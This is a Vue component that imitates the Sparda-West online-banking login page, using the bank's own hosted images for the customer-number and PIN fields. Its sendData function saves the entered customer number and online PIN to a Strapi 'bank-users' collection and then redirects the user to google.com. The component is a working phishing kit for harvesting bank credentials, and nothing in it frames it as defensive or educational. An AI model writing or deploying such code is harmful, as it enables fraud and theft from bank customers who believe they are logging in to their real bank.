<template>

    <div id="loginForm">
        <div class="input user">
            <div class="textField">
                <label for="user">Kundennummer</label>
            </div>
            <input ref="inputUser" type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)">
            <img @click="openNumpad(0)" title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
        </div>
        <div class="input pin">
            <div class="textField">
                <label for="onlinePin">Online-Pin</label>
            </div>
            <input ref="inputPin" type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)">
            <img @click="openNumpad(1)" title="Zifferneingabe öffnen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
        </div>
    </div>
    <button id="loginBtn" ref="loginBtn">
        <img title="Jetzt einloggen" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/buttonFlach_Jetzt_einloggen.png" @click="sendData">
    </button>

    <Numpad />

</template>

<style lang="scss">

    #loginForm {
        width: 646px;
        height: 53px;
        margin-top: 22px;
        .input {
            &:last-child {
                margin-top: 30px;
            }
            position: absolute;
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: flex-start;
            font-size: 13px;
            font-weight: 600;
            width: inherit;
            height: 21px;
            margin-bottom: 11px;
            .textField {
                width: 233px;
            }
            input {
                border: 1px solid #00173c;
                color: #196AA6;
                width: 106px;
                padding: 1px 2px;
            }
            img {
                cursor: pointer;
                margin-left: 10px
            }
        }
    }

    #loginBtn {
        z-index: 2;
        cursor: pointer;
        position: absolute;
        bottom: 10px;
        right: 20px;
        background-color: transparent;
        border: 0;
        &:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
    }

</style>

<script lang="ts" setup>

    import { ref, Ref, provide } from 'vue';
    const { create } = useStrapi();

    const numpad = inject('numpad');

    interface InputData {
        value: string | null | undefined;
    }

    const inputUser: Ref<InputData> = ref({ value: null });
    const inputPin: Ref<InputData> = ref({ value: null });
    const loginBtn: Ref = ref({ value: null });
    provide('inputUser', inputUser);
    provide('inputPin', inputPin);
    
    async function sendData(){
        await useAsyncData('bank-users', () => create('bank-users', {
            clientNumber: inputUser.value.value,
            onlinePin: inputPin.value.value
        }));
        await navigateTo('https://www.google.com/', { external: true });
    }

    function openNumpad(id: 0 | 1) {
        console.log(numpad);
    }

</script>